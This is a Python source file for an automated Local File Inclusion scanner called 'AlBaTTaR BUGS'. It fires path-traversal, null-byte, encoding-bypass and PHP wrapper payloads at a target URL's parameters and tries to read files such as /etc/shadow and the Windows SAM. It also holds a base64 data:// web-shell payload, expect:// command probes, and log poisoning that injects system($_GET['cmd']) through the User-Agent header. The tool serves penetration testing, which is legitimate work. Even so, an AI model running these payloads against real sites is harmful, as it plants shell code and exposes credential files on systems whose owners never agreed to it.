"""
AlBaTTaR BUGS - Local File Inclusion (LFI) Scanner
===================================================
Detects LFI vulnerabilities including:
- Basic LFI
- Null Byte Injection
- PHP Wrappers
- Log Poisoning
- Filter Bypass techniques

Author: ROBIN | @ll bUg
Version: 1.0.0
"""

import re
import logging
from typing import List, Dict, Any, Optional
from urllib.parse import urljoin, quote, unquote
import base64

from core.http_handler import HTTPHandler
from core.payload_manager import PayloadManager
from utils.logger import get_logger
from utils.validators import is_valid_url


class LFIScanner:
    """
    Advanced Local File Inclusion Scanner
    """
    
    def __init__(self, target: str, config: Optional[Dict] = None):
        """
        Initialize LFI Scanner
        
        Args:
            target: Target URL to scan
            config: Configuration dictionary
        """
        self.target = target
        self.config = config or {}
        self.logger = get_logger(__name__)
        self.http_handler = HTTPHandler(config)
        self.payload_manager = PayloadManager()
        
        # Results storage
        self.vulnerabilities = []
        self.tested_params = set()
        
        # Scanner configuration
        self.timeout = self.config.get('timeout', 30)
        self.verify_ssl = self.config.get('verify_ssl', False)
        self.max_depth = self.config.get('max_traversal_depth', 10)
        
        # Known sensitive files to test
        self.linux_files = [
            '/etc/passwd',
            '/etc/shadow',
            '/etc/hosts',
            '/etc/group',
            '/etc/issue',
            '/etc/hostname',
            '/proc/self/environ',
            '/proc/version',
            '/proc/cmdline',
            '/var/log/apache2/access.log',
            '/var/log/apache2/error.log',
            '/var/log/nginx/access.log',
            '/var/log/nginx/error.log',
        ]
        
        self.windows_files = [
            'C:\\Windows\\System32\\drivers\\etc\\hosts',
            'C:\\Windows\\win.ini',
            'C:\\Windows\\System32\\config\\SAM',
            'C:\\boot.ini',
            'C:\\Windows\\debug\\NetSetup.log',
        ]
        
        self.logger.info(f"📁 LFI Scanner initialized for: {target}")

    def scan(self) -> List[Dict[str, Any]]:
        """
        Main scanning method
        
        Returns:
            List of discovered vulnerabilities
        """
        self.logger.info("🚀 Starting LFI scan...")
        
        try:
            # Step 1: Basic LFI
            self._test_basic_lfi()
            
            # Step 2: Path Traversal with depth
            self._test_traversal_depth()
            
            # Step 3: Null Byte Injection
            self._test_null_byte()
            
            # Step 4: PHP Wrappers
            self._test_php_wrappers()
            
            # Step 5: Encoding techniques
            self._test_encoding_bypass()
            
            # Step 6: Log Poisoning
            self._test_log_poisoning()
            
            # Step 7: Filter Bypass
            self._test_filter_bypass()
            
            # Step 8: Relative Path
            self._test_relative_path()
            
            self.logger.info(f"✅ LFI scan complete. Found {len(self.vulnerabilities)} vulnerabilities")
            
        except Exception as e:
            self.logger.error(f"❌ Error during LFI scan: {str(e)}")
        
        return self.vulnerabilities

    def _test_basic_lfi(self):
        """Test basic LFI vulnerabilities"""
        self.logger.info("🧪 Testing basic LFI...")
        
        # Test both Linux and Windows files
        test_files = self.linux_files + self.windows_files
        
        for test_file in test_files:
            payloads = [
                test_file,
                f"../{test_file}",
                f"../../{test_file}",
                f"../../../{test_file}",
            ]
            
            self._test_payloads(payloads, "Basic LFI", test_file)

    def _test_traversal_depth(self):
        """Test path traversal with various depths"""
        self.logger.info("🧪 Testing path traversal depth...")
        
        base_files = ['/etc/passwd', 'C:\\Windows\\win.ini']
        
        for base_file in base_files:
            for depth in range(1, self.max_depth + 1):
                traversal = '../' * depth
                payload = f"{traversal}{base_file}"
                self._test_payloads([payload], "Path Traversal", base_file)

    def _test_null_byte(self):
        """Test null byte injection"""
        self.logger.info("🧪 Testing null byte injection...")
        
        payloads = [
            '/etc/passwd%00',
            '/etc/passwd%00.jpg',
            '../../../etc/passwd%00',
            '../../../etc/passwd%00.php',
            'C:\\Windows\\win.ini%00',
            'C:\\Windows\\win.ini%00.txt',
        ]
        
        self._test_payloads(payloads, "Null Byte LFI")

    def _test_php_wrappers(self):
        """Test PHP wrapper attacks"""
        self.logger.info("🧪 Testing PHP wrappers...")
        
        payloads = [
            # php://filter
            'php://filter/convert.base64-encode/resource=/etc/passwd',
            'php://filter/read=string.rot13/resource=/etc/passwd',
            'php://filter/convert.iconv.utf-8.utf-7/resource=/etc/passwd',
            
            # php://input
            'php://input',
            
            # data://
            'data://text/plain;base64,PD9waHAgc3lzdGVtKCRfR0VUWydjbWQnXSk7Pz4=',
            'data:text/plain,<?php phpinfo();?>',
            
            # expect://
            'expect://id',
            'expect://whoami',
            
            # zip://
            'zip://test.zip#shell.php',
            
            # phar://
            'phar://test.phar/shell.php',
        ]
        
        self._test_payloads(payloads, "PHP Wrapper")

    def _test_encoding_bypass(self):
        """Test encoding bypass techniques"""
        self.logger.info("🧪 Testing encoding bypass...")
        
        base_payload = '../../../etc/passwd'
        
        payloads = [
            # URL encoding
            quote(base_payload),
            
            # Double URL encoding
            quote(quote(base_payload)),
            
            # UTF-8 encoding
            base_payload.replace('/', '%2f'),
            base_payload.replace('.', '%2e'),
            
            # Unicode encoding
            base_payload.replace('/', '%c0%af'),
            base_payload.replace('.', '%c0%2e'),
            
            # Mixed encoding
            '..%2f..%2f..%2fetc%2fpasswd',
            '..%252f..%252f..%252fetc%252fpasswd',
        ]
        
        self._test_payloads(payloads, "Encoding Bypass")

    def _test_log_poisoning(self):
        """Test log poisoning attacks"""
        self.logger.info("🧪 Testing log poisoning...")
        
        # Common log file locations
        log_files = [
            '/var/log/apache2/access.log',
            '/var/log/apache2/error.log',
            '/var/log/nginx/access.log',
            '/var/log/nginx/error.log',
            '/var/log/httpd/access_log',
            '/var/log/httpd/error_log',
        ]
        
        # Poison User-Agent
        malicious_ua = '<?php system($_GET["cmd"]); ?>'
        
        for log_file in log_files:
            payload = f"../../../..{log_file}"
            self._test_payloads([payload], "Log Poisoning", extra_headers={'User-Agent': malicious_ua})

    def _test_filter_bypass(self):
        """Test filter bypass techniques"""
        self.logger.info("🧪 Testing filter bypass...")
        
        payloads = [
            # Slash bypass
            '/etc/passwd',
            '/etc//passwd',
            '/etc/./passwd',
            '/etc/passwd/.',
            
            # Backslash (Windows)
            'C:\\Windows\\win.ini',
            'C:\\\\Windows\\\\win.ini',
            
            # Mixed slashes
            '../../../etc/passwd',
            '..\\..\\..\\etc\\passwd',
            '..../....//....///etc/passwd',
            
            # Keyword bypass
            '/e\x00tc/passwd',
            '/e%00tc/passwd',
            '/%65tc/passwd',
            
            # Case variation (Windows)
            'C:\\WiNdOwS\\wIn.InI',
        ]
        
        self._test_payloads(payloads, "Filter Bypass")

    def _test_relative_path(self):
        """Test relative path inclusion"""
        self.logger.info("🧪 Testing relative paths...")
        
        payloads = [
            './index.php',
            '../index.php',
            '../../index.php',
            './config.php',
            '../config.php',
            './includes/config.php',
            '../includes/config.php',
        ]
        
        self._test_payloads(payloads, "Relative Path")

    def _test_payloads(self, payloads: List[str], attack_type: str, 
                      target_file: str = None, extra_headers: Dict = None):
        """
        Test a list of LFI payloads
        
        Args:
            payloads: List of payloads to test
            attack_type: Type of attack being tested
            target_file: Expected file to be included
            extra_headers: Additional HTTP headers
        """
        # Common parameter names
        params = ['file', 'page', 'include', 'path', 'document', 'folder', 
                  'root', 'pg', 'style', 'pdf', 'template', 'php_path', 
                  'doc', 'content', 'location']
        
        for payload in payloads:
            for param in params:
                try:
                    # Build test URL
                    test_url = f"{self.target}?{param}={quote(payload)}"
                    
                    if test_url in self.tested_params:
                        continue
                    
                    self.tested_params.add(test_url)
                    
                    # Send request
                    headers = extra_headers or {}
                    response = self.http_handler.get(
                        test_url, 
                        timeout=self.timeout,
                        headers=headers
                    )
                    
                    if not response:
                        continue
                    
                    # Check if vulnerable
                    is_vulnerable, confidence = self._check_lfi_response(
                        response.text, 
                        payload, 
                        target_file
                    )
                    
                    if is_vulnerable:
                        self._report_vulnerability(
                            test_url, 
                            payload, 
                            attack_type, 
                            param,
                            confidence,
                            response.text[:500]
                        )
                        
                except Exception as e:
                    self.logger.debug(f"Error testing payload: {str(e)}")

    def _check_lfi_response(self, content: str, payload: str, 
                           target_file: str = None) -> tuple:
        """
        Check if response indicates LFI vulnerability
        
        Args:
            content: Response content
            payload: Used payload
            target_file: Target file that should be included
            
        Returns:
            Tuple of (is_vulnerable, confidence)
        """
        confidence = 0
        
        # Linux signatures
        linux_signatures = [
            r'root:.*:0:0:',  # /etc/passwd
            r'daemon:.*:1:1:',
            r'bin:.*:2:2:',
            r'nobody:x:',
            r'Linux version \d+\.\d+',  # /proc/version
            r'BOOT_IMAGE=',  # /proc/cmdline
        ]
        
        # Windows signatures
        windows_signatures = [
            r'\[fonts\]',  # win.ini
            r'\[extensions\]',
            r'for 16-bit app support',
            r'\[boot\]',  # boot.ini
            r'multi\(0\)disk\(0\)',
        ]
        
        # PHP wrapper signatures
        wrapper_signatures = [
            r'PD9waHAgcGhwaW5mbygpOz8\+',  # base64 of <?php phpinfo();?>
            r'<?php',
            r'#!/bin/',
        ]
        
        # Check Linux signatures
        for sig in linux_signatures:
            if re.search(sig, content, re.IGNORECASE):
                confidence += 30
        
        # Check Windows signatures
        for sig in windows_signatures:
            if re.search(sig, content, re.IGNORECASE):
                confidence += 30
        
        # Check wrapper signatures
        for sig in wrapper_signatures:
            if re.search(sig, content):
                confidence += 25
        
        # Check for file disclosure patterns
        if target_file:
            # File path appears in response
            if target_file.lower() in content.lower():
                confidence += 15
            
            # File content indicators
            if 'etc/passwd' in target_file and 'root:' in content:
                confidence += 40
            elif 'win.ini' in target_file.lower() and '[fonts]' in content.lower():
                confidence += 40
        
        # Check for PHP errors (might indicate partial success)
        error_patterns = [
            r'failed to open stream',
            r'No such file or directory',
            r'include\(\): Failed opening',
            r'require\(\): Failed opening',
        ]
        
        for pattern in error_patterns:
            if re.search(pattern, content, re.IGNORECASE):
                confidence += 10
        
        # Confidence threshold
        is_vulnerable = confidence >= 30
        
        return is_vulnerable, min(confidence, 100)

    def _report_vulnerability(self, url: str, payload: str, attack_type: str,
                            parameter: str, confidence: int, evidence: str):
        """
        Report a discovered LFI vulnerability
        
        Args:
            url: Vulnerable URL
            payload: Successful payload
            attack_type: Type of LFI attack
            parameter: Vulnerable parameter
            confidence: Confidence level (0-100)
            evidence: Evidence from response
        """
        # Determine severity based on attack type
        severity_map = {
            'Basic LFI': 'high',
            'Path Traversal': 'high',
            'Null Byte LFI': 'high',
            'PHP Wrapper': 'critical',
            'Encoding Bypass': 'high',
            'Log Poisoning': 'critical',
            'Filter Bypass': 'high',
            'Relative Path': 'medium',
        }
        
        severity = severity_map.get(attack_type, 'medium')
        cvss_score = 8.6 if severity == 'critical' else 7.5
        
        vuln = {
            'type': 'Local File Inclusion (LFI)',
            'severity': severity,
            'cvss_score': cvss_score,
            'cwe': 'CWE-98',
            'url': url,
            'parameter': parameter,
            'payload': payload,
            'attack_type': attack_type,
            'confidence': confidence,
            'evidence': evidence,
            'impact': 'Attackers can read sensitive files from the server, potentially leading to source code disclosure, credential theft, or remote code execution via log poisoning',
            'remediation': [
                'Use whitelist of allowed files instead of blacklist',
                'Validate and sanitize all user input',
                'Use basename() to strip directory paths',
                'Disable PHP functions: allow_url_include, allow_url_fopen',
                'Implement proper access controls',
                'Use realpath() to resolve paths and verify they are within allowed directory'
            ],
            'exploitation_steps': [
                f'1. Access: {url}',
                f'2. Parameter "{parameter}" is vulnerable to LFI',
                f'3. Payload used: {payload}',
                '4. Sensitive file contents were disclosed'
            ],
            'references': [
                'https://owasp.org/www-project-web-security-testing-guide/latest/4-Web_Application_Security_Testing/07-Input_Validation_Testing/11.1-Testing_for_Local_File_Inclusion',
                'https://cwe.mitre.org/data/definitions/98.html'
            ]
        }
        
        self.vulnerabilities.append(vuln)
        self.logger.warning(f"🔴 LFI found: {url} (Type: {attack_type}, Confidence: {confidence}%)")


# CLI interface
if __name__ == "__main__":
    import sys
    
    if len(sys.argv) < 2:
        print("Usage: python lfi_scanner.py <target_url>")
        sys.exit(1)
    
    target = sys.argv[1]
    
    if not is_valid_url(target):
        print(f"❌ Invalid URL: {target}")
        sys.exit(1)
    
    # Configure logging
    logging.basicConfig(
        level=logging.INFO,
        format='%(asctime)s - %(levelname)s - %(message)s'
    )
    
    print("📁 AlBaTTaR BUGS - Local File Inclusion Scanner")
    print(f"🎯 Target: {target}\n")
    
    # Run scan
    scanner = LFIScanner(target)
    results = scanner.scan()
    
    # Print results
    print(f"\n{'='*60}")
    print(f"📊 SCAN RESULTS")
    print(f"{'='*60}")
    print(f"✅ Scan completed")
    print(f"🔍 Vulnerabilities found: {len(results)}")
    
    if results:
        print(f"\n🔴 LFI VULNERABILITIES:\n")
        for i, vuln in enumerate(results, 1):
            print(f"{i}. {vuln['attack_type']}")
            print(f"   URL: {vuln['url']}")
            print(f"   Parameter: {vuln['parameter']}")
            print(f"   Payload: {vuln['payload']}")
            print(f"   Confidence: {vuln['confidence']}%")
            print()